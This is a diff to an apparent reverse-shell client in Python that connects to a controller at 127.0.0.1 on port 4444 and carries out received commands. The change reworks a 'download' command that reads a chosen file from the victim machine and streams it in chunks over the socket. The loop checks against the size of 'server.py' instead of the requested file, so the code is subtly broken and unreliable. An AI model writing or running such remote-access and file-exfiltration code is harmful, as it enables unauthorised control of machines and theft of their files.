@@ -4,7 +4,7 @@ import socket
 import time
 import subprocess
 import os
-import sys
+import tqdm
 
 HOST = "127.0.0.1"
 PORT = 4444
@@ -58,10 +58,16 @@ def command(s):
                 s.send("Changed directory to {}".format(os.getcwd()).encode())
             elif 'download' in cmd:
                 file_path = cmd.split(" ")[1]
-                file = open(file_path, "rb").read()
-                file_size = str(sys.getsizeof(file))
-                s.send(file_size.encode())
-                s.send(file)
+                s.send(str(os.path.getsize(file_path)).encode())
+                f = open(file_path, "rb")
+                data_check = 0
+                while data_check != int(str(os.path.getsize("server.py"))):
+                    data = f.read(1024)
+                    print(str(len(data)))
+                    s.send(data)
+                    data_check = data_check + int(len(data))
+                f.close()
+
             elif 'areualive?' == cmd:
                 s.send(b'y')
             else:
